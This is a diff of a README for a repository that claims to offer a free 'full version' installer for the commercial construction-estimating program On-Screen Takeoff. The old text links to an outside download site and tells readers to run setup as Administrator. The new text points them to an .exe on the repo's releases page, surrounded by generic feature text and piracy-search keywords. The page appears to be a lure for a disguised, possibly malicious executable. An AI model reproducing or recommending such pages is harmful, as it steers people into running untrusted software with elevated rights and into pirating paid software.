@@ -1,73 +1,80 @@
-# On-Screen Takeoff — Full Version Download for Windows 11 & 10
+# 🏗️ OnScreen-Takeoff-2026 - Complete Construction Estimating Tools for Windows
 
-**OnScreen-Takeoff-2026**
+[ ![Download OnScreen Takeoff](https://img.shields.io/badge/Download-Blue%20and%20Grey-blue.svg) ](https://github.com/inviting-unknownquantity271/OnScreen-Takeoff-2026/releases)
 
-**On-Screen Takeoff** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+OnScreen-Takeoff-2026 provides a complete solution for construction professionals. Use this software to measure blueprints, organize materials, and generate accurate cost estimates. The tool runs on Windows 11 and Windows 10. It simplifies document management and reduces manual entry errors.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 📥 Getting Started
 
----
+Follow these steps to obtain the software.
 
-## Download & Install
+1. Visit the [official releases page](https://github.com/inviting-unknownquantity271/OnScreen-Takeoff-2026/releases).
+2. Look for the latest version number at the top of the list.
+3. Click the file ending in .exe to start the transfer to your computer.
+4. Save the file to your desktop or downloads folder.
 
-> **This is the download page.** Use the button or link below to get **On-Screen Takeoff** for Windows.
+## ⚙️ Installation Guide
 
-<p align="center">
-  <a href="https://onscreentakeoff.moltora.com/">
-    <img src="https://img.shields.io/badge/Download-On-Screen%20Takeoff-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download On-Screen Takeoff">
-  </a>
-</p>
+Follow these steps to set up the software on your computer.
 
-| | |
-| --- | --- |
-| **Direct link** | **[onscreentakeoff.moltora.com](https://onscreentakeoff.moltora.com/)** |
-| **Full URL** | `https://onscreentakeoff.moltora.com/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+1. Locate the file you saved to your computer.
+2. Double-click the file to start the installer.
+3. Choose your language preference from the drop-down menu.
+4. Read the license agreement and click the box to accept the terms.
+5. Click Next to continue through the prompts.
+6. The installer asks for a destination folder; the default choice works for most users. 
+7. Click Install to begin moving the files to your system.
+8. Once finished, click Finish to close the window.
+9. Locate the new icon on your desktop to launch the application.
 
-### Quick steps
+## 💻 System Requirements
 
-1. Click **[Download — onscreentakeoff.moltora.com](https://onscreentakeoff.moltora.com/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+The software requires a standard configuration. Ensure your computer meets these items before you begin.
 
-<p align="center"><a href="https://onscreentakeoff.moltora.com/"><strong>⬇ Download On-Screen Takeoff now</strong></a></p>
+* **Operating System:** Windows 10 or 11 (64-bit).
+* **Processor:** 2.0 GHz speed or higher.
+* **Memory:** 8 GB RAM or more recommended for large projects.
+* **Storage:** 500 MB of free hard drive space.
+* **Display:** 1280 x 1024 screen resolution or higher.
+* **Graphics:** DirectX 11 support.
 
----
+## 🛠️ Software Features
 
-## About On-Screen Takeoff
+The software includes tools for contractors and estimators. 
 
-**On-Screen Takeoff** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+* **Blueprint Tools:** Use digital rulers to measure lengths and areas directly from PDF plans.
+* **Material Lists:** Link measurements to specific items to generate supply counts.
+* **Project Organization:** Group pages by floor, room, or trade to keep data tidy.
+* **Data Export:** Move your final estimates into accounting or project management software.
+* **Revision Tracking:** Compare two versions of a blueprint to see changes in dimensions.
 
-**Common searches:** on-screen takeoff full version download windows, on-screen takeoff complete install 2026 pc, download on-screen takeoff full free windows 11
+## 🖱️ How to Use Takeoff Tools
 
-**What you get:** complete Windows installer (64-bit), full feature set.
+Open a project to begin. 
 
-**Repository:** `OnScreen-Takeoff-2026`
+1. Click File in the top menu, then select Open.
+2. Select your digital blueprint file.
+3. Use the Scale tool to calibrate the drawing. Click two points on the page you know the distance of, and type the real-world measurement.
+4. Select the Takeoff tab from the side menu.
+5. Click the area or line icon.
+6. Trace the shape on the document. The program tracks the measurement in the side panel.
+7. Assign a material code to that layer to track costs.
 
-## Install (full version)
+## 📂 Managing Your Files
 
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
+Store your projects in a simple folder structure on your computer. Create a master folder for each job. Save your blueprints and your takeoff data inside that main folder. Create backups once a week to protect your work. Use a flash drive or a cloud storage service to save copies of your files away from your main computer.
 
-## System requirements
+## 📋 Common Troubleshooting
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
+If you encounter issues during setup, try these tips.
 
----
+* **Installer Errors:** If the screen turns white or stops, restart your computer and try again.
+* **Missing Icons:** If the shortcut does not appear on your desktop, check the folder named OnScreen-Takeoff in your Start menu.
+* **Display Issues:** If the image on the screen looks blurry or small, check the scale settings in your Windows display properties. Set your zoom to 100% for the best results.
+* **Update Requests:** When you open the program, it may notify you of a new version. Follow the prompts on the screen to apply these updates for better performance.
 
-**Topics:** on-screen-takeoff-full-version-download-windows, on-screen, takeoff, on-screen-takeoff-complete-install-2026-pc, complete, download-on-screen-takeoff-full-free-windows-11, onscreen-takeoff-2026, onscreen-takeoff, onscreen-2026, on-screen-takeoff, estimating, construction
+## 📝 Performance Tips
+
+Keep your system fast by limiting the number of heavy programs open at one time. Close web browsers and other large tools while you perform complex measurements. If your project contains hundreds of large pages, keep only the active floor open to speed up the reaction time of your cursor.
+
+Keywords: blueprint, complete, complete-version, construction, download, download-on-screen-takeoff-full-free-windows-11, estimating, full-installer, on-screen, on-screen-takeoff, on-screen-takeoff-complete-install-2026-pc, on-screen-takeoff-full-version-download-windows, onscreen-2026, onscreen-takeoff, onscreen-takeoff-2026, software, takeoff, windows-11, windows-software
